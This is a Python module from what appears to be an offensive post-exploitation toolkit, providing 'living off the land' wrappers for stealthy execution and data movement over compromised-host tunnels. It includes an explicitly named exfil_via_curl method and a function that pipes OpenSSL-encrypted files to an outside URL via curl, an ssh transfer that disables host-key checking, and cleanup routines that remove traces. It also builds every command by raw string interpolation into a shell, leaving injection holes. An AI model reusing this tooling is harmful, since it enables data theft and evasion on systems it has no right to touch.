# sovereign_movement/slide/lolbin.py
"""
LOLBin — Living Off The Land Binaries Helper for The Slide

Provides stealthy wrappers for legitimate system binaries used in
execution, file transfer, encoding, and encrypted data movement.
"""

from __future__ import annotations
from typing import Optional, Callable
import base64
import logging
import os
import subprocess

from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel

logger = logging.getLogger("sovereign.slide.lolbin")


class LOLBin:
    def __init__(self, tunnel: Optional[SovereignTunnel] = None):
        self.tunnel = tunnel

    # ============================================================
    # Execution
    # ============================================================

    def execute_python(self, code: str, tunnel_id: Optional[str] = None) -> str:
        cmd = f'python3 -c "{code}"'
        return self._run_command(cmd, tunnel_id)

    def execute_awk(self, script: str, input_data: str = "", tunnel_id: Optional[str] = None) -> str:
        cmd = f"awk '{script}'"
        if input_data:
            cmd = f'echo "{input_data}" | {cmd}'
        return self._run_command(cmd, tunnel_id)

    # ============================================================
    # OpenSSL Encrypted File Transfer (with cleanup)
    # ============================================================

    def encrypt_file_openssl(
        self,
        input_path: str,
        output_path: str,
        password: str,
        cipher: str = "aes-256-cbc",
    ) -> bool:
        cmd = (
            f"openssl enc -{cipher} -salt -in {input_path} "
            f"-out {output_path} -k '{password}' -pbkdf2"
        )
        self._run_command(cmd)
        return os.path.exists(output_path)

    def decrypt_file_openssl(
        self,
        input_path: str,
        output_path: str,
        password: str,
        cipher: str = "aes-256-cbc",
    ) -> bool:
        cmd = (
            f"openssl enc -d -{cipher} -in {input_path} "
            f"-out {output_path} -k '{password}' -pbkdf2"
        )
        self._run_command(cmd)
        return os.path.exists(output_path)

    def transfer_encrypted_via_openssl(
        self,
        local_path: str,
        remote_path: str,
        password: str,
        tunnel_id: Optional[str] = None,
        progress_callback: Optional[Callable] = None,
        cipher: str = "aes-256-cbc",
    ) -> bool:
        if not self.tunnel or not tunnel_id:
            logger.error("[LOLBin] No tunnel available for encrypted transfer")
            return False

        encrypted_local = f"{local_path}.enc"
        encrypted_remote = f"{remote_path}.enc"
        success = False

        try:
            if not self.encrypt_file_openssl(local_path, encrypted_local, password, cipher):
                logger.error("[LOLBin] Local encryption failed")
                return False

            transfer_ok = self.tunnel.send_file(
                tunnel_id, encrypted_local, encrypted_remote, progress_callback
            )
            if not transfer_ok:
                logger.error("[LOLBin] Encrypted file transfer failed")
                return False

            decrypt_cmd = (
                f"openssl enc -d -{cipher} -in {encrypted_remote} "
                f"-out {remote_path} -k '{password}' -pbkdf2 && rm -f {encrypted_remote}"
            )
            result = self.tunnel.execute_command(tunnel_id, decrypt_cmd)

            if result.success:
                success = True
                logger.info(f"[LOLBin] Encrypted transfer completed: {remote_path}")
            else:
                logger.error(f"[LOLBin] Remote decryption failed: {result.stderr}")
                self.tunnel.execute_command(tunnel_id, f"rm -f {encrypted_remote}")

        except Exception as e:
            logger.error(f"[LOLBin] Encrypted transfer exception: {e}")
            if self.tunnel and tunnel_id:
                try:
                    self.tunnel.execute_command(tunnel_id, f"rm -f {encrypted_remote}")
                except Exception:
                    pass
        finally:
            self._safe_remove_local_file(encrypted_local)

        return success

    def _safe_remove_local_file(self, file_path: str):
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except Exception as e:
                logger.warning(f"[LOLBin] Failed to remove local file {file_path}: {e}")

    # ============================================================
    # Streaming Encrypted Transfer (Stealthier)
    # ============================================================

    def stream_encrypt_via_ssh(
        self,
        local_path: str,
        remote_path: str,
        password: str,
        tunnel_id: Optional[str] = None,
        cipher: str = "aes-256-cbc",
    ) -> bool:
        if not self.tunnel or not tunnel_id:
            logger.error("[LOLBin] No tunnel available for streaming transfer")
            return False

        tunnel_state = self.tunnel.active_tunnels.get(tunnel_id)
        if not tunnel_state:
            logger.error(f"[LOLBin] Tunnel {tunnel_id} not found")
            return False

        encrypt_cmd = f"openssl enc -{cipher} -salt -pbkdf2 -in {local_path} -k '{password}'"
        decrypt_cmd = f"openssl enc -d -{cipher} -pbkdf2 -k '{password}' > {remote_path}"

        full_cmd = (
            f"{encrypt_cmd} | ssh -o StrictHostKeyChecking=no "
            f"{tunnel_state.username}@{tunnel_state.target_host} '{decrypt_cmd}'"
        )

        logger.info(f"[LOLBin] Starting streaming encrypted transfer to {remote_path}")

        try:
            result = self.tunnel.execute_command(tunnel_id, full_cmd, timeout=300)
            if result.success:
                logger.info(f"[LOLBin] Streaming transfer completed: {remote_path}")
                return True
            else:
                logger.error(f"[LOLBin] Streaming transfer failed: {result.stderr}")
                return False
        except Exception as e:
            logger.error(f"[LOLBin] Streaming transfer exception: {e}")
            return False

    def stream_encrypt_via_curl(
        self,
        local_path: str,
        url: str,
        password: str,
        tunnel_id: Optional[str] = None,
        cipher: str = "aes-256-cbc",
    ) -> bool:
        if not self.tunnel or not tunnel_id:
            return False

        cmd = (
            f"openssl enc -{cipher} -salt -pbkdf2 -in {local_path} -k '{password}' | "
            f"curl -s -X POST --data-binary @- {url}"
        )
        result = self.tunnel.execute_command(tunnel_id, cmd, timeout=120)
        return result.success

    # ============================================================
    # Other Transfer Methods
    # ============================================================

    def transfer_via_scp(
        self,
        local_path: str,
        remote_path: str,
        tunnel_id: Optional[str] = None,
        progress_callback: Optional[Callable] = None,
    ) -> bool:
        if not self.tunnel or not tunnel_id:
            return False
        return self.tunnel.send_file(tunnel_id, local_path, remote_path, progress_callback)

    def exfil_via_curl(self, url: str, data: str, tunnel_id: Optional[str] = None) -> bool:
        cmd = f'curl -s -X POST -d "{data}" {url}'
        result = self._run_command(cmd, tunnel_id)
        return "200" in result or result == ""

    # ============================================================
    # Encoding
    # ============================================================

    def encode_base64(self, data: str) -> str:
        return base64.b64encode(data.encode()).decode()

    def decode_base64(self, data: str) -> str:
        return base64.b64decode(data).decode(errors="ignore")

    # ============================================================
    # Internal
    # ============================================================

    def _run_command(self, command: str, tunnel_id: Optional[str] = None) -> str:
        if self.tunnel and tunnel_id:
            result = self.tunnel.execute_command(tunnel_id, command)
            return result.stdout if result.success else ""
        else:
            try:
                output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
                return output.strip()
            except subprocess.CalledProcessError as e:
                logger.error(f"[LOLBin] Command failed: {e}")
                return ""